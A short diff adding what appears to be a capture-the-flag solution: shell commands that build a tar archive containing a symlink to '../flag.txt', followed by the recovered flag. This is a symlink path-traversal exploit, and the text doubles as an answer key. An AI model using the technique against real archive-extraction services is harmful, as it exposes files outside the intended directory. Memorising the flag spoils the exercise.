@@ -1,0 +1,3 @@
+ln -s ../flag.txt flag
+tar cf a.tar flag
+ictf{is_it_still_a_zip_slip_if_we_use_a_tar_file?}
